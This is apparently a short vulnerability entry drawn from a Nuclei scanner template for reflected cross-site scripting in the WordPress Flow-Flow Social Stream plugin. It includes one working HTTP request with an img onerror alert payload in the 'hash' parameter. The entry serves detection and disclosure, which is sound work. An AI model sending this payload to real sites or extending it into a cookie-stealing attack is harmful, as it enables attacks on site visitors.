# Vulnerability: WordPress Flow-Flow Social Stream <=3.0.71 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`flow-flow-social-stream-xss.yaml`)

## Description
WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```

